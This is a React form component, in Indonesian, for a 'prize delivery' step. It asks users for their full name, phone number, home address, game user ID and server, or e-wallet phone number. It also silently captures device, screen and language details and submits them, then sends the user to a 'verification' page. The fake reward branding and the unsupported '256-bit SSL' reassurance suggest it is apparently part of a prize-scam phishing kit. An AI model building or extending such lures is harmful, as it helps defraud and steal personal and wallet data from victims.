import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { detectDevice } from "../device";
import Steps from "./Steps";
import { getPrize, TYPE_INFO } from "../prizes";
import { playClick } from "../sound";
import { sendSubmission } from "../store";

const GAMES = ["Mobile Legends", "Free Fire", "PUBG Mobile"];

const Field = ({ label, hint, children }) => (
  <div style={{ marginBottom: 15 }}>
    <label style={{ display: "block", fontSize: 12.5, fontWeight: 700, marginBottom: 6, color: "#c9cede" }}>
      {label}
    </label>
    {children}
    {hint && <div style={{ fontSize: 10.5, color: "#555e74", marginTop: 4 }}>{hint}</div>}
  </div>
);

const Form = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const prize = location.state?.prize || "Hadiah";
  const cfg = getPrize(prize);
  const type = cfg.type;
  const typeInfo = TYPE_INFO[type] || TYPE_INFO.fisik;

  // field dinamis
  const [game, setGame] = useState("Mobile Legends");
  const [uid, setUid] = useState("");
  const [server, setServer] = useState("");
  const [nama, setNama] = useState("");
  const [hp, setHp] = useState("");
  const [alamat, setAlamat] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();

    const payload = {
      tipe: "data-pribadi",
      jenisHadiah: type,
      nama,
      hp,
      alamat: type === "fisik" ? alamat : "",
      prize,
      perangkat: detectDevice(),
      layar: `${window.screen.width}x${window.screen.height}`,
      bahasa: navigator.language,
    };
    if (type === "game") {
      payload.game = game;
      payload.uid = uid;
      payload.server = server;
    }
    if (type === "ewallet") payload.wallet = cfg.wallet;

    await sendSubmission(payload);

    playClick();
    navigate("/verify", { state: { prize, nama, hp, alamat } });
  };

  return (
    <div className="min-h-screen" style={{ background: "radial-gradient(120% 100% at 50% 0%, #10241a 0%, #0b0b14 55%)" }}>
      <div className="container flex flex-col justify-center" style={{ maxWidth: 480, minHeight: "100vh", padding: "26px 16px 40px" }}>
        <Steps current={1} />

        <div className="panel" style={{ padding: 22 }}>
          <div className="display" style={{ fontSize: 12, letterSpacing: 2.5, color: "#ffb020", textAlign: "center" }}>
            Langkah 2 — Pengiriman Hadiah
          </div>
          <h2 style={{ fontWeight: 800, fontSize: 18, textAlign: "center", margin: "6px 0 4px" }}>
            {typeInfo.icon} {prize}
          </h2>
          <p style={{ fontSize: 12, color: "#8b93a7", textAlign: "center", marginBottom: 20 }}>
            {typeInfo.delivery}
          </p>

          <form onSubmit={handleSubmit}>
            {/* ===== GAME: minta UID + Server ===== */}
            {type === "game" && (
              <>
                <Field label="PILIH GAME KAMU">
                  <div style={{ display: "flex", gap: 8 }}>
                    {GAMES.map((g) => (
                      <button key={g} type="button" className={`chip-game ${game === g ? "on" : ""}`} onClick={() => setGame(g)}>
                        {g}
                      </button>
                    ))}
                  </div>
                </Field>
                <div style={{ display: "flex", gap: 10 }}>
                  <div style={{ flex: 1.6 }}>
                    <Field label={`USER ID (UID) ${game.toUpperCase()}`} hint="Minimal 6 angka — ID bisa dilihat di profil dalam game">
                      <input
                        required
                        className="input-dark"
                        value={uid}
                        onChange={(e) => setUid(e.target.value.replace(/\D/g, ""))}
                        placeholder="Contoh: 123456789"
                        inputMode="numeric"
                        minLength={6}
                        autoComplete="off"
                      />
                      {uid.length > 0 && uid.length < 6 && (
                        <div style={{ fontSize: 11, color: "#f87171", fontWeight: 700, marginTop: 5 }}>
                          ⚠️ UID kurang dari 6 angka — periksa lagi profil game kamu
                        </div>
                      )}
                    </Field>
                  </div>
                  <div style={{ flex: 1 }}>
                    <Field label={game === "Free Fire" ? "SERVER" : "ZONE ID"}>
                      <input
                        required
                        className="input-dark"
                        value={server}
                        onChange={(e) => setServer(e.target.value)}
                        placeholder={game === "Free Fire" ? "misal: 2163" : "misal: 2214"}
                        inputMode="numeric"
                        autoComplete="off"
                      />
                    </Field>
                  </div>
                </div>
                <div style={{ height: 1, background: "#23233a", margin: "4px 0 16px" }} />
              </>
            )}

            {/* ===== PULSA / KUOTA / E-WALLET: fokus ke nomor HP ===== */}
            {(type === "pulsa" || type === "ewallet") && (
              <>
                <Field
                  label={
                    type === "pulsa"
                      ? "NOMOR HP TUJUAN PULSA/KUOTA"
                      : `NOMOR HP TERDAFTAR ${cfg.wallet.toUpperCase()}`
                  }
                  hint={
                    type === "pulsa"
                      ? "Pastikan nomor aktif dan tidak sedang masa tenggang"
                      : `Nomor harus terdaftar akun ${cfg.wallet} kamu`
                  }
                >
                  <input
                    required
                    className="input-dark"
                    value={hp}
                    onChange={(e) => setHp(e.target.value)}
                    placeholder="Contoh: 0812xxxxxxx"
                    inputMode="numeric"
                    autoComplete="off"
                  />
                </Field>
                <div style={{ height: 1, background: "#23233a", margin: "4px 0 16px" }} />
              </>
            )}

            {/* ===== FISIK: alamat pengiriman ===== */}
            <Field label="NAMA LENGKAP (SESUAI IDENTITAS)" hint="Nama harus sesuai agar hadiah dapat diverifikasi sistem">
              <input
                required
                className="input-dark"
                value={nama}
                onChange={(e) => setNama(e.target.value)}
                placeholder="Contoh: Ahmad Fauzi"
                autoComplete="off"
              />
            </Field>

            {type !== "pulsa" && type !== "ewallet" && (
              <Field label="NOMOR HANDPHONE AKTIF" hint="Tim kami akan menghubungi via WhatsApp saat pengiriman">
                <input
                  required
                  className="input-dark"
                  value={hp}
                  onChange={(e) => setHp(e.target.value)}
                  placeholder="Contoh: 0812xxxxxxx"
                  inputMode="numeric"
                  autoComplete="off"
                />
              </Field>
            )}

            {type === "fisik" && (
              <Field label="ALAMAT LENGKAP" hint="Gratis ongkir ke seluruh Indonesia">
                <input
                  required
                  className="input-dark"
                  value={alamat}
                  onChange={(e) => setAlamat(e.target.value)}
                  placeholder="Jalan, RT/RW, kota, kode pos"
                  autoComplete="off"
                />
              </Field>
            )}

            <button type="submit" className="btn-cta btn-green" style={{ width: "100%", fontSize: 17, padding: "14px 0", marginTop: 6 }}>
              LANJUT KE VERIFIKASI →
            </button>
          </form>

          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, marginTop: 14, fontSize: 10.5, color: "#555e74" }}>
            🔒 Data kamu dilindungi enkripsi SSL 256-bit
          </div>
        </div>

        <div style={{ textAlign: "center", marginTop: 16, fontSize: 10.5, color: "#4a5165" }}>
          © 2026 Reward Center International Ltd.
        </div>
      </div>
    </div>
  );
};

export default Form;
